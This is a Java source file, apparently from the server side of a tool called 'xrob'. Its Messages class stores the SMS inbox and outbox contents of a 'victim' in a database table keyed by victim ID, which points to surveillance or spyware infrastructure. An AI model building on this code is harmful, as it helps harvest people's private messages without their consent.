package com.theah64.xrob.api.database.tables;


import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Message;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.List;

/**
 * Created by theapache64 on 9/4/16.
 */
public class Messages extends BaseTable<Message> {

    private static final String KEY_TYPE_INBOX = "inbox";
    private static final String KEY_TYPE_OUTBOX = "outbox";
    private static final String COLUMN_PHONE = "phone";
    private static final String COLUMN_CONTENT = "content";
    private static final String COLUMN_DELIVERED_AT = "delivered_at";
    public static final String COLUMN_VICTIM_ID = "victim_id";
    private static Messages instance = new Messages();

    public Messages() {
        super("messages");
    }

    public static Messages getInstance() {
        return instance;
    }

    /**
     * To add new message to the database.
     *
     * @param victimId
     * @param jOb
     * @return
     */
    @Override
    public boolean add(final String victimId, JSONObject jOb) {

        //TODO: need to modify

        boolean isAdded = true;

        final String existenceQuery = "SELECT id FROM messages WHERE phone = ? AND content = ? AND delivered_at = ? AND _type = ? LIMIT 1";
        final String addQuery = "INSERT INTO messages (victim_id,phone,content,_type,delivered_at) VALUES (?,?,?,?,?);";

        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement addPs = con.prepareStatement(addQuery);
            final PreparedStatement existencePs = con.prepareStatement(existenceQuery);

            final String[] keyInboxOutbox = {KEY_TYPE_INBOX, KEY_TYPE_OUTBOX};

            //Saving inbox message
            try {

                //Looping through inbox and outbox node.
                for (int i = 0; i < keyInboxOutbox.length; i++) {

                    if (jOb.has(keyInboxOutbox[i])) {

                        final JSONArray jaInboxOutbox = jOb.getJSONArray(keyInboxOutbox[i]);

                        for (int j = 0; j < jaInboxOutbox.length(); j++) {

                            final JSONObject jInMessage = jaInboxOutbox.getJSONObject(j);
                            final String phone = jInMessage.getString(COLUMN_PHONE);
                            final String content = jInMessage.getString(COLUMN_CONTENT);
                            final long deliveryTimestamp = jInMessage.getLong(COLUMN_DELIVERED_AT);

                            //Checking existence
                            existencePs.setString(1, phone);
                            existencePs.setString(2, content);
                            existencePs.setLong(3, deliveryTimestamp);
                            existencePs.setString(4, keyInboxOutbox[i]);

                            final ResultSet rs = existencePs.executeQuery();
                            final boolean isExists = rs.first();
                            rs.close();

                            if (!isExists) {
                                addPs.setString(1, victimId);
                                addPs.setString(2, phone);
                                addPs.setString(3, content);
                                addPs.setString(4, keyInboxOutbox[i]);
                                addPs.setLong(5, deliveryTimestamp);

                                isAdded = addPs.executeUpdate() == 1 && isAdded;
                            }
                        }

                    }

                }

            } catch (JSONException e) {
                e.printStackTrace();
                isAdded = false;
            }

            addPs.close();
            existencePs.close();

        } catch (SQLException e) {
            e.printStackTrace();
            isAdded = false;
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        return isAdded;
    }

    @Override
    public List<Message> getAll(String whereColumn, String whereColumnValue) {
        List<Message> messages = null;
        //TODO: Return messages of the victim
        return messages;
    }
}
